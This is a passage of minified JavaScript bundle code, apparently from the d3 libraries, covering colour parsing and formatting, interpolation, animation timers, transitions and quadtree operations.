84,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};go(Qs,Us,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Gc,formatHex:Gc,formatHex8:T0,formatHsl:C0,formatRgb:Yc,toString:Yc});function Gc(){return this.rgb().formatHex()}function T0(){return this.rgb().formatHex8()}function C0(){return Kd(this).formatHsl()}function Yc(){return this.rgb().formatRgb()}function Us(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=w0.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?qc(n):t===3?new Ce(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?mr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?mr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=k0.exec(e))?new Ce(n[1],n[2],n[3],1):(n=x0.exec(e))?new Ce(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=b0.exec(e))?mr(n[1],n[2],n[3],n[4]):(n=_0.exec(e))?mr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=S0.exec(e))?Qc(n[1],n[2]/100,n[3]/100,1):(n=E0.exec(e))?Qc(n[1],n[2]/100,n[3]/100,n[4]):$c.hasOwnProperty(e)?qc($c[e]):e==="transparent"?new Ce(NaN,NaN,NaN,0):null}function qc(e){return new Ce(e>>16&255,e>>8&255,e&255,1)}function mr(e,n,t,s){return s<=0&&(e=n=t=NaN),new Ce(e,n,t,s)}function N0(e){return e instanceof Qs||(e=Us(e)),e?(e=e.rgb(),new Ce(e.r,e.g,e.b,e.opacity)):new Ce}function ul(e,n,t,s){return arguments.length===1?N0(e):new Ce(e,n,t,s??1)}function Ce(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}go(Ce,ul,Xd(Qs,{brighter(e){return e=e==null?li:Math.pow(li,e),new Ce(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?Bs:Math.pow(Bs,e),new Ce(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new Ce(rt(this.r),rt(this.g),rt(this.b),oi(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Xc,formatHex:Xc,formatHex8:A0,formatRgb:Kc,toString:Kc}));function Xc(){return`#${nt(this.r)}${nt(this.g)}${nt(this.b)}`}function A0(){return`#${nt(this.r)}${nt(this.g)}${nt(this.b)}${nt((isNaN(this.opacity)?1:this.opacity)*255)}`}function Kc(){const e=oi(this.opacity);return`${e===1?"rgb(":"rgba("}${rt(this.r)}, ${rt(this.g)}, ${rt(this.b)}${e===1?")":`, ${e})`}`}function oi(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function rt(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function nt(e){return e=rt(e),(e<16?"0":"")+e.toString(16)}function Qc(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new qe(e,n,t,s)}function Kd(e){if(e instanceof qe)return new qe(e.h,e.s,e.l,e.opacity);if(e instanceof Qs||(e=Us(e)),!e)return new qe;if(e instanceof qe)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new qe(a,l,o,e.opacity)}function P0(e,n,t,s){return arguments.length===1?Kd(e):new qe(e,n,t,s??1)}function qe(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}go(qe,P0,Xd(Qs,{brighter(e){return e=e==null?li:Math.pow(li,e),new qe(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?Bs:Math.pow(Bs,e),new qe(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new Ce(oa(e>=240?e-240:e+120,r,s),oa(e,r,s),oa(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new qe(Zc(this.h),gr(this.s),gr(this.l),oi(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=oi(this.opacity);return`${e===1?"hsl(":"hsla("}${Zc(this.h)}, ${gr(this.s)*100}%, ${gr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function Zc(e){return e=(e||0)%360,e<0?e+360:e}function gr(e){return Math.max(0,Math.min(1,e||0))}function oa(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Qd=e=>()=>e;function L0(e,n){return function(t){return e+t*n}}function R0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function O0(e){return(e=+e)==1?Zd:function(n,t){return t-n?R0(n,t,e):Qd(isNaN(n)?t:n)}}function Zd(e,n){var t=n-e;return t?L0(e,t):Qd(isNaN(e)?n:e)}const Jc=function e(n){var t=O0(n);function s(r,i){var a=t((r=ul(r)).r,(i=ul(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Zd(r.opacity,i.opacity);return function(u){return r.r=a(u),r.g=l(u),r.b=o(u),r.opacity=c(u),r+""}}return s.gamma=e,s}(1);function Cn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var pl=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,ca=new RegExp(pl.source,"g");function M0(e){return function(){return e}}function j0(e){return function(n){return e(n)+""}}function I0(e,n){var t=pl.lastIndex=ca.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=pl.exec(e))&&(r=ca.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:Cn(s,r)})),t=ca.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?j0(o[0].x):M0(n):(n=o.length,function(c){for(var u=0,m;u<n;++u)l[(m=o[u]).i]=m.x(c);return l.join("")})}var eu=180/Math.PI,dl={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Jd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*eu,skewX:Math.atan(o)*eu,scaleX:a,scaleY:l}}var vr;function z0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?dl:Jd(n.a,n.b,n.c,n.d,n.e,n.f)}function D0(e){return e==null||(vr||(vr=document.createElementNS("http://www.w3.org/2000/svg","g")),vr.setAttribute("transform",e),!(e=vr.transform.baseVal.consolidate()))?dl:(e=e.matrix,Jd(e.a,e.b,e.c,e.d,e.e,e.f))}function eh(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,u,m,h,g,k){if(c!==m||u!==h){var y=g.push("translate(",null,n,null,t);k.push({i:y-4,x:Cn(c,m)},{i:y-2,x:Cn(u,h)})}else(m||h)&&g.push("translate("+m+n+h+t)}function a(c,u,m,h){c!==u?(c-u>180?u+=360:u-c>180&&(c+=360),h.push({i:m.push(r(m)+"rotate(",null,s)-2,x:Cn(c,u)})):u&&m.push(r(m)+"rotate("+u+s)}function l(c,u,m,h){c!==u?h.push({i:m.push(r(m)+"skewX(",null,s)-2,x:Cn(c,u)}):u&&m.push(r(m)+"skewX("+u+s)}function o(c,u,m,h,g,k){if(c!==m||u!==h){var y=g.push(r(g)+"scale(",null,",",null,")");k.push({i:y-4,x:Cn(c,m)},{i:y-2,x:Cn(u,h)})}else(m!==1||h!==1)&&g.push(r(g)+"scale("+m+","+h+")")}return function(c,u){var m=[],h=[];return c=e(c),u=e(u),i(c.translateX,c.translateY,u.translateX,u.translateY,m,h),a(c.rotate,u.rotate,m,h),l(c.skewX,u.skewX,m,h),o(c.scaleX,c.scaleY,u.scaleX,u.scaleY,m,h),c=u=null,function(g){for(var k=-1,y=h.length,x;++k<y;)m[(x=h[k]).i]=x.x(g);return m.join("")}}}var B0=eh(z0,"px, ","px)","deg)"),F0=eh(D0,", ",")",")"),U0=1e-12;function nu(e){return((e=Math.exp(e))+1/e)/2}function V0(e){return((e=Math.exp(e))-1/e)/2}function H0(e){return((e=Math.exp(2*e))-1)/(e+1)}const W0=function e(n,t,s){function r(i,a){var l=i[0],o=i[1],c=i[2],u=a[0],m=a[1],h=a[2],g=u-l,k=m-o,y=g*g+k*k,x,p;if(y<U0)p=Math.log(h/c)/n,x=function(A){return[l+A*g,o+A*k,c*Math.exp(n*A*p)]};else{var f=Math.sqrt(y),v=(h*h-c*c+s*y)/(2*c*t*f),w=(h*h-c*c-s*y)/(2*h*t*f),_=Math.log(Math.sqrt(v*v+1)-v),N=Math.log(Math.sqrt(w*w+1)-w);p=(N-_)/n,x=function(A){var P=A*p,z=nu(_),M=c/(t*f)*(z*H0(n*P+_)-V0(_));return[l+M*g,o+M*k,c*z/nu(n*P+_)]}}return x.duration=p*1e3*n/Math.SQRT2,x}return r.rho=function(i){var a=Math.max(.001,+i),l=a*a,o=l*l;return e(a,l,o)},r}(Math.SQRT2,2,4);var Wt=0,cs=0,ss=0,nh=1e3,ci,us,ui=0,pt=0,Ri=0,Vs=typeof performance=="object"&&performance.now?performance:Date,th=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function vo(){return pt||(th($0),pt=Vs.now()+Ri)}function $0(){pt=0}function pi(){this._call=this._time=this._next=null}pi.prototype=yo.prototype={constructor:pi,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?vo():+t)+(n==null?0:+n),!this._next&&us!==this&&(us?us._next=this:ci=this,us=this),this._call=e,this._time=t,hl()},stop:function(){this._call&&(this._call=null,this._time=1/0,hl())}};function yo(e,n,t){var s=new pi;return s.restart(e,n,t),s}function G0(){vo(),++Wt;for(var e=ci,n;e;)(n=pt-e._time)>=0&&e._call.call(void 0,n),e=e._next;--Wt}function tu(){pt=(ui=Vs.now())+Ri,Wt=cs=0;try{G0()}finally{Wt=0,q0(),pt=0}}function Y0(){var e=Vs.now(),n=e-ui;n>nh&&(Ri-=n,ui=e)}function q0(){for(var e,n=ci,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:ci=t);us=e,hl(s)}function hl(e){if(!Wt){cs&&(cs=clearTimeout(cs));var n=e-pt;n>24?(e<1/0&&(cs=setTimeout(tu,e-Vs.now()-Ri)),ss&&(ss=clearInterval(ss))):(ss||(ui=Vs.now(),ss=setInterval(Y0,nh)),Wt=1,th(tu))}}function su(e,n,t){var s=new pi;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var X0=Pi("start","end","cancel","interrupt"),K0=[],sh=0,ru=1,fl=2,Rr=3,iu=4,ml=5,Or=6;function Oi(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else if(t in a)return;Q0(e,t,{name:n,index:s,group:r,on:X0,tween:K0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:sh})}function wo(e,n){var t=Je(e,n);if(t.state>sh)throw new Error("too late; already scheduled");return t}function ln(e,n){var t=Je(e,n);if(t.state>Rr)throw new Error("too late; already running");return t}function Je(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function Q0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=yo(i,0,t.time);function i(c){t.state=ru,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var u,m,h,g;if(t.state!==ru)return o();for(u in s)if(g=s[u],g.name===t.name){if(g.state===Rr)return su(a);g.state===iu?(g.state=Or,g.timer.stop(),g.on.call("interrupt",e,e.__data__,g.index,g.group),delete s[u]):+u<n&&(g.state=Or,g.timer.stop(),g.on.call("cancel",e,e.__data__,g.index,g.group),delete s[u])}if(su(function(){t.state===Rr&&(t.state=iu,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=fl,t.on.call("start",e,e.__data__,t.index,t.group),t.state===fl){for(t.state=Rr,r=new Array(h=t.tween.length),u=0,m=-1;u<h;++u)(g=t.tween[u].value.call(e,e.__data__,t.index,t.group))&&(r[++m]=g);r.length=m+1}}function l(c){for(var u=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=ml,1),m=-1,h=r.length;++m<h;)r[m].call(e,u);t.state===ml&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=Or,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function Mr(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>fl&&s.state<ml,s.state=Or,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function Z0(e){return this.each(function(){Mr(this,e)})}function J0(e,n){var t,s;return function(){var r=ln(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function ew(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=ln(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function nw(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Je(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?J0:ew)(t,e,n))}function ko(e,n,t){var s=e._id;return e.each(function(){var r=ln(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Je(r,s).value[n]}}function rh(e,n){var t;return(typeof n=="number"?Cn:n instanceof Us?Jc:(t=Us(n))?(n=t,Jc):I0)(e,n)}function tw(e){return function(){this.removeAttribute(e)}}function sw(e){return function(){this.removeAttributeNS(e.space,e.local)}}function rw(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function iw(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function aw(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function lw(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function ow(e,n){var t=Li(e),s=t==="transform"?F0:rh;return this.attrTween(e,typeof n=="function"?(t.local?lw:aw)(t,s,ko(this,"attr."+e,n)):n==null?(t.local?sw:tw)(t):(t.local?iw:rw)(t,s,n))}function cw(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function uw(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function pw(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&uw(e,i)),t}return r._value=n,r}function dw(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&cw(e,i)),t}return r._value=n,r}function hw(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=Li(e);return this.tween(t,(s.local?pw:dw)(s,n))}function fw(e,n){return function(){wo(this,e).delay=+n.apply(this,arguments)}}function mw(e,n){return n=+n,function(){wo(this,e).delay=n}}function gw(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?fw:mw)(n,e)):Je(this.node(),n).delay}function vw(e,n){return function(){ln(this,e).duration=+n.apply(this,arguments)}}function yw(e,n){return n=+n,function(){ln(this,e).duration=n}}function ww(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?vw:yw)(n,e)):Je(this.node(),n).duration}function kw(e,n){if(typeof n!="function")throw new Error;return function(){ln(this,e).ease=n}}function xw(e){var n=this._id;return arguments.length?this.each(kw(n,e)):Je(this.node(),n).ease}function bw(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;ln(this,e).ease=t}}function _w(e){if(typeof e!="function")throw new Error;return this.each(bw(this._id,e))}function Sw(e){typeof e!="function"&&(e=Bd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new xn(s,this._parents,this._name,this._id)}function Ew(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],u=o.length,m=a[l]=new Array(u),h,g=0;g<u;++g)(h=o[g]||c[g])&&(m[g]=h);for(;l<s;++l)a[l]=n[l];return new xn(a,this._parents,this._name,this._id)}function Tw(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function Cw(e,n,t){var s,r,i=Tw(n)?wo:ln;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function Nw(e,n){var t=this._id;return arguments.length<2?Je(this.node(),t).on.on(e):this.each(Cw(t,e,n))}function Aw(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function Pw(){return this.on("end.remove",Aw(this._id))}function Lw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=fo(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),u,m,h=0;h<o;++h)(u=l[h])&&(m=e.call(u,u.__data__,h,l))&&("__data__"in u&&(m.__data__=u.__data__),c[h]=m,Oi(c[h],n,t,h,c,Je(u,t)));return new xn(i,this._parents,n,t)}function Rw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Dd(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,u,m=0;m<c;++m)if(u=o[m]){for(var h=e.call(u,u.__data__,m,o),g,k=Je(u,t),y=0,x=h.length;y<x;++y)(g=h[y])&&Oi(g,n,t,y,h,k);i.push(h),a.push(u)}return new xn(i,a,n,t)}var Ow=Ks.prototype.constructor;function Mw(){return new Ow(this._groups,this._parents)}function jw(e,n){var t,s,r;return function(){var i=Ht(this,e),a=(this.style.removeProperty(e),Ht(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function ih(e){return function(){this.style.removeProperty(e)}}function Iw(e,n,t){var s,r=t+"",i;return function(){var a=Ht(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function zw(e,n,t){var s,r,i;return function(){var a=Ht(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Ht(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function Dw(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=ln(this,e),c=o.on,u=o.value[i]==null?l||(l=ih(n)):void 0;(c!==t||r!==u)&&(s=(t=c).copy()).on(a,r=u),o.on=s}}function Bw(e,n,t){var s=(e+="")=="transform"?B0:rh;return n==null?this.styleTween(e,jw(e,s)).on("end.style."+e,ih(e)):typeof n=="function"?this.styleTween(e,zw(e,s,ko(this,"style."+e,n))).each(Dw(this._id,e)):this.styleTween(e,Iw(e,s,n),t).on("end.style."+e,null)}function Fw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function Uw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&Fw(e,a,t)),s}return i._value=n,i}function Vw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,Uw(e,n,t??""))}function Hw(e){return function(){this.textContent=e}}function Ww(e){return function(){var n=e(this);this.textContent=n??""}}function $w(e){return this.tween("text",typeof e=="function"?Ww(ko(this,"text",e)):Hw(e==null?"":e+""))}function Gw(e){return function(n){this.textContent=e.call(this,n)}}function Yw(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&Gw(r)),n}return s._value=e,s}function qw(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,Yw(e))}function Xw(){for(var e=this._name,n=this._id,t=ah(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var u=Je(o,n);Oi(o,e,t,c,a,{time:u.time+u.delay+u.duration,delay:0,duration:u.duration,ease:u.ease})}return new xn(s,this._parents,e,t)}function Kw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=ln(this,s),u=c.on;u!==e&&(n=(e=u).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var Qw=0;function xn(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function ah(){return++Qw}var cn=Ks.prototype;xn.prototype={constructor:xn,select:Lw,selectAll:Rw,selectChild:cn.selectChild,selectChildren:cn.selectChildren,filter:Sw,merge:Ew,selection:Mw,transition:Xw,call:cn.call,nodes:cn.nodes,node:cn.node,size:cn.size,empty:cn.empty,each:cn.each,on:Nw,attr:ow,attrTween:hw,style:Bw,styleTween:Vw,text:$w,textTween:qw,remove:Pw,tween:nw,delay:gw,duration:ww,ease:xw,easeVarying:_w,end:Kw,[Symbol.iterator]:cn[Symbol.iterator]};function Zw(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var Jw={time:null,delay:0,duration:250,ease:Zw};function e1(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function n1(e){var n,t;e instanceof xn?(n=e._id,e=e._name):(n=ah(),(t=Jw).time=vo(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&Oi(o,e,n,c,a,t||e1(o,n));return new xn(s,this._parents,e,n)}Ks.prototype.interrupt=Z0;Ks.prototype.transition=n1;function t1(e,n){var t,s=1;e==null&&(e=0),n==null&&(n=0);function r(){var i,a=t.length,l,o=0,c=0;for(i=0;i<a;++i)l=t[i],o+=l.x,c+=l.y;for(o=(o/a-e)*s,c=(c/a-n)*s,i=0;i<a;++i)l=t[i],l.x-=o,l.y-=c}return r.initialize=function(i){t=i},r.x=function(i){return arguments.length?(e=+i,r):e},r.y=function(i){return arguments.length?(n=+i,r):n},r.strength=function(i){return arguments.length?(s=+i,r):s},r}function s1(e){const n=+this._x.call(null,e),t=+this._y.call(null,e);return lh(this.cover(n,t),n,t,e)}function lh(e,n,t,s){if(isNaN(n)||isNaN(t))return e;var r,i=e._root,a={data:s},l=e._x0,o=e._y0,c=e._x1,u=e._y1,m,h,g,k,y,x,p,f;if(!i)return e._root=a,e;for(;i.length;)if((y=n>=(m=(l+c)/2))?l=m:c=m,(x=t>=(h=(o+u)/2))?o=h:u=h,r=i,!(i=i[p=x<<1|y]))return r[p]=a,e;if(g=+e._x.call(null,i.data),k=+e._y.call(null,i.data),n===g&&t===k)return a.next=i,r?r[p]=a:e._root=a,e;do r=r?r[p]=new Array(4):e._root=new Array(4),(y=n>=(m=(l+c)/2))?l=m:c=m,(x=t>=(h=(o+u)/2))?o=h:u=h;while((p=x<<1|y)===(f=(k>=h)<<1|g>=m));return r[f]=i,r[p]=a,e}function r1(e){var n,t,s=e.length,r,i,a=new Array(s),l=new Array(s),o=1/0,c=1/0,u=-1/0,m=-1/0;for(t=0;t<s;++t)isNaN(r=+this._x.call(null,n=e[t]))||isNaN(i=+this._y.call(null,n))||(a[t]=r,l[t]=i,r<o&&(o=r),r>u&&(u=r),i<c&&(c=i),i>m&&(m=i));if(o>u||c>m)return this;for(this.cover(o,c).cover(u,m),t=0;t<s;++t)lh(this,a[t],l[t],e[t]);return this}function i1(e,n){if(isNaN(e=+e)||isNaN(n=+n))return this;var t=this._x0,s=this._y0,r=this._x1,i=this._y1;if(isNaN(t))r=(t=Math.floor(e))+1,i=(s=Math.floor(n))+1;else{for(var a=r-t||1,l=this._root,o,c;t>e||e>=r||s>n||n>=i;)switch(c=(n<s)<<1|e<t,o=new Array(4),o[c]=l,l=o,a*=2,c){case 0:r=t+a,i=s+a;break;case 1:t=r-a,i=s+a;break;case 2:r=t+a,s=i-a;break;case 3:t=r-a,s=i-a;break}this._root&&this._root.length&&(this._root=l)}return this._x0=t,this._y0=s,this._x1=r,this._y1=i,this}function a1(){var e=[];return this.visit(function(n){if(!n.length)do e.push(n.data);while(n=n.next)}),e}function l1(e){return arguments.length?this.cover(+e[0][0],+e[0][1]).cover(+e[1][0],+e[1][1]):isNaN(this._x0)?void 0:[[this._x0,this._y0],[this._x1,this._y1]]}function ke(e,n,t,s,r){this.node=e,this.x0=n,this.y0=t,this.x1=s,this.y1=r}function o1(e,n,t){var s,r=this._x0,i=this._y0,a,l,o,c,u=this._x1,m=this._y1,h=[],g=this._root,k,y;for(g&&h.push(new ke(g,r,i,u,m)),t==null?t=1/0:(r=e-t,i=n-t,u=e+t,m=n+t,t*=t);k=h.pop();)if(!(!(g=k.node)||(a=k.x0)>u||(l=k.y0)>m||(o=k.x1)<r||(c=k.y1)<i))if(g.length){var x=(a+o)/2,p=(l+c)/2;h.push(new ke(g[3],x,p,o,c),new ke(g[2],a,p,x,c),new ke(g[1],x,l,o,p),new ke(g[0],a,l,x,p)),(y=(n>=p)<<1|e>=x)&&(k=h[h.length-1],h[h.length-1]=h[h.length-1-y],h[h.length-1-y]=k)}else{var f=e-+this._x.call(null,g.data),v=n-+this._y.call(null,g.data),w=f*f+v*v;if(w<t){var _=Math.sqrt(t=w);r=e-_,i=n-_,u=e+_,m=n+_,s=g.data}}return s}function c1(e){if(isNaN(u=+this._x.call(null,e))||isNaN(m=+this._y.call(null,e)))return this;var n,t=this._root,s,r,i,a=this._x0,l=this._y0,o=this._x1,c=this._y1,u,m,h,g,k,y,x,p;if(!t)return this;if(t.length)for(;;){if((k=u>=(h=(a+o)/2))?a=h:o=h,(y=m>=(g=(l+c)/2))?l=g:c=g,n=t,!(t=t[x=y<<1|k]))return this;if(!t.length)break;(n[x+1&3]||n[x+2&3]||n[x+3&3])&&(s=n,p=x)}for(;t.data!==e;)if(r=t,!(t=t.next))return this;return(i=t.next)&&delete t.next,r?(i?r.next=i:delete r.next,this):n?(i?n[x]=i:delete n[x],(t=n[0]||n[1]||n[2]||n[3])&&t===(n[3]||n[2]||n[1]||n[0])&&!t.length&&(s?s[p]=t:this._root=t),this):(this._root=i,this)}function u1(e){for(var n=0,t=e.length;n<t;++n)this.remove(e[n]);return this}function p1(){return this._root}function d1(){var e=0;return this.visit(function(n){if(!n.length)do++e;while(n=n.next)}),e}function h1(e){var n=[],t,s=this._root,r,i,a,l,o;for(s&&n.push(new ke(s,this._x0,this._y0,this._x1,this._y1));t=n.pop();)if(!e(s=t.node,i=t.x0,a=t.y0,l=t.x1,o=t.y1)&&s.length){var c=(i+l)/2,u=(a+o)/2;(r=s[3])&&n.push(new 